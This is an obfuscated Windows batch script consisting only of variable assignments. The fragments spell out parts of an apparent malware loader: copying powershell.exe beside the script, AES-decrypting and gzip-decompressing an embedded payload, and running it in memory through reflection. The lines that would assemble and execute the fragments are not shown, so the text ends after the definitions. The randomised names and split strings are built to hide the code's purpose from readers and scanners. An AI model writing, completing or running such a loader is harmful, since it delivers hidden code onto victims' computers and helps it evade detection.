@echo off
set "XBaWyCHdqo=st"
set "WzgJBObpYt=po"
set "GvIguAyDda=he"
set "lWZzTPXxlQ=\W"
set "sVPzZAzzSH=rS"
set "sshyBzwcIL=do"
set "TABfPUuwJd=rs"
set "WOaJlhpVwI=py"
set "qXtKsXwYkt=s\"
set "MHFgXDjGmT=he"
set "xeYiXtXSMf=we"
set "GfwsVpYWBC=y "
set "hwIIEvYbTH=.e"
set "ulxXKfovOy=0\"
set "UyfYnMLSkh=32"
set "rBcYkIxCjw=Sy"
set "qyygYqALyG=Wi"
set "fSttibcuFU=\v"
set "jqGSCCvvoz= /"
set "rnpRNuRsBM=:\"
set "mBycxBpvwi=co"
set "psIWCZLwIq=in"
set "oOQuQJziVR=ow"
set "cqpOHFGdyo=1."
set "vVfjKSmBEb= C"
set "apkTOTOAXt=we"
set "WSTEvBPivo=Po"
set "RsPGqTpfuL=em"
set "QOTidUtqNB=ws"
set "tFFVHQzRkt=xe"
set "RJPMIrwpsF=nd"
set "DrffQqnpZq=ll"
set "JnGuLAEZtj=ll"
set "gwRfnOxCmN=cd"
set "ExMQmrbUSI= %~dp0"
set "kuonaxyoVb=[Sys"
set "NGywSkehHT=grap"
set "rnTzNZIbmA=onve"
set "KtWXPsFnha=16] "
set "mFmeeSjGsz=d;$p"
set "jIYngfngil=Obje"
set "ePDTzuVksW=O.Me"
set "DbskZGhmrX=7;$p"
set "LyysXUPcnk=ddin"
set "CtzLboYIsa=tryP"
set "luWohNKNpP=rt]:"
set "zTmwxQToWs=n ''"
set "YoAOrxcmTL=Va, "
set "yAKyyryyLu=dVDT"
set "tSffgUwwXy=TVoV"
set "baYgUHxFUR=tem."
set "sbUmZhAOPC=TllA"
set "dFZfRKLmnO=rofi"
set "iVnmNmfwNd=PKCS"
set "GELyZbNhmh=V = "
set "oCfffpUaEt=gMod"
set "KvCtIiBAHn== $p"
set "iNniBcdqTw=brea"
set "TRYLGLKkjX=zOEe"
set "TGgtWBOWzE=)))"
set "rStOFcMfCO=Kp ="
set "VdTbvLJmRa=3); "
set "WbQGPnqgHm=se()"
set "wobWGhmLdT=('Tg"
set "psNsJtSBlg=zHhH"
set "zdFBdAdZYg=oryS"
set "sZzUONzzeA=yste"
set "NklRrBJrkY=ress"
set "bPUgtCyYpv=e = "
set "FKBNhgyMbn=$Vqu"
set "AkrOOgYmOV=-Obj"
set "zivShxlunO=tem."
set "AIOYNeozAW=Kp);"
set "jynBPixocH= = ["
set "yYGMZxxpnA=le  "
set "ZANDMJZKrs=.Dis"
set "NXJakipCdM=-joi"
set "fBmgDaNZQV=$dVD"
set "HKjVGinUHo=.Cop"
set "kOSZFILyhx=y.Ci"
set "ByMWCCIDTG='0Pg"
set "KwHnWkTSEd=]::N"
set "lhpWvACUjZ=$xKU"
set "XCLnVfRvmI=]::("
set "uyiIHRNYWS=ress"
set "kAkZbccseX=yTo("
set "SVbUCIhFPE=pQue"
set "MMMChciEUH=ose("
set "fIfYORLFTJ=ew-O"
set "BSZCUVthWE=bstr"
set "LzYnvUPVdv=gsYZ"
set "DStvUOxYPe=ert]"
set "TrEAQxWTRH=$WzL"
set "xcbDDWqmPS=zOEe"
set "cvrWEMNkBl=$sHk"
set "WHmcUZaxgY=oin "
set "HWcFDrgqTE=O.En"
set "hCoKiTHfde=$GTV"
set "TpWslJnBpf=.Cre"
set "uwBxdVDJGD=xKUK"
set "cXKvypfcBP=Syst"
set "okiQLsFLsA= [st"
set "YSsEzMxuqN=tsWi"
set "RpfihmBlrY=s75K"
set "zCWEVDnmKg=join"
set "DzBhqCJlke=-1.."
set "tFzAQLdxVs=ose("
set "bSvlrHPaXs=tS46"
set "XuvSQebbJL=eQ.I"
set "sWKRemurjb=::De"
set "VGKNUQmsaV=stem"
set "NGIQSgHoyX=eMVs"
set "FbwJPtaXVY=[Env"
set "LubqlyovKB=oint"
set "EriKuIucRj=KUKp"
set "QmAyuuNfqx=ct S"
set "iKcuoZBzYb=esMa"
set "qMbgjLCIZY=pose"
set "lwYDKfWUJG=hy.A"
set "ResZJdTtPd=oV.D"
set "VaAFxomXZy=;$Wz"
set "lIBgahWepM=VJg "
set "AAEfVmIIDw=]::("
set "NHFDKyrFmZ=ewLi"
set "HwOhLpmMxT=lit("
set "IKvjrsfRIk=Bmor"
set "imsxmsWhvS=y.Pa"
set "GNTlPyqior=ksi "
set "ElygOrbRfu=-nop"
set "pijcEerGsK=ypto"
